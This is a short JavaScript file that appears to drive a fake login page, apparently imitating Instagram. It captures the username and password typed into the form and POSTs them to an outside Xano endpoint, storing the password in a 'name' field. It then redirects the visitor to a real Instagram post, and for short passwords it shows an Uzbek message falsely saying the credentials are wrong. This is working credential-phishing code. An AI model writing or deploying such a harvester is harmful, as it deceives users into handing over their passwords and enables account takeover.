let form = document.getElementById('form');
let username = document.getElementById('Rectangle_1');
let password = document.getElementById('Rectangle_2');
let subBtn = document.getElementById('Rectangle_3');



form.addEventListener('submit', e => {
  e.preventDefault()
  let data = {
    name:password.value,
    email:`${username.value}@gmail.com`,
    password: null
  }


  function FetchingData() {
    fetch('https://x8ki-letl-twmt.n7.xano.io/api:wh9Fla_N/auth/signup',{
      method:'POST',
      headers:{
        'Content-Type':'application/json'
      },
      body:JSON.stringify(data)
    })
      .then(res => res.json())
      .then(data => console.log(data))
      
  }

  if(password.value.length>6){
    FetchingData()
  }else {
    alert("Parolingiz yoki Foydalanuvchi nomi noto'g'ri kiritilgan !")
  }
  window.location.href = "https://www.instagram.com/p/CZHOENLAAGc/?utm_source=ig_web_copy_link";
  
})
